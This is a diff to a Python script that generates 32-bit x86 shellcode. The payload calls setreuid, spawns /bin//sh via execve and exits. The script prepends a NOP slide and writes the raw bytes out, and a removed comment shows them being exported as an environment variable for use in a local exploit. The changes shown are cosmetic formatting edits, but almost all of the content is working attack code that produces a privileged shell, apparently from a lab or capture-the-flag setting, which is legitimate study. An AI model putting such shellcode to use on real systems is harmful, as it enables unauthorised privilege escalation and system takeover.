@@ -3,7 +3,7 @@ import sys
 
 NOP_SLIDE = 50
 
-print = lambda *args, **kwargs: None # override print function
+print = lambda *args, **kwargs: None  # override print function
 
 
 # setreuid(geteuid(), geteuid())
@@ -34,7 +34,7 @@ shellcode = (
     b"\xb0\x0b"  # mov al, 0x0b (11)
     b"\xcd\x80"  # int 0x80 (execv("/bin//sh", argv))
 
-        # mv eax, 1         ; system call number (sys_exit)
+    # mv eax, 1         ; system call number (sys_exit)
     b"\x6a\x01"  # push 1
     b"\x58"      # pop eax (sys_exit)
     # int 0x80
@@ -54,15 +54,14 @@ nop_slide = b"\x90" * NOP_SLIDE
 formatted_shellcode = nop_slide + shellcode
 
 # Convert to formatted string
-formatted_string = "".join(f"\\x{byte:02x}" for byte in formatted_shellcode)
+formatted_string = "".join("\\x{:02x}".format(byte) for byte in formatted_shellcode)
 print(formatted_string)
 
 # Print shellcode in hex format
 print("\nShellcode in hex format:")
-print("".join(f"{byte:02x}" for byte in formatted_shellcode))
+print("".join("{:02x}".format(byte) for byte in formatted_shellcode))
 
 # Calculate shellcode length
-print(f"\nLength of shellcode is {len(formatted_shellcode)} bytes")
+print("\nLength of shellcode is {} bytes".format(len(formatted_shellcode)))
 
 sys.stdout.buffer.write(formatted_shellcode)
-# export SHELLCODE=$(python3 shellcode.py)
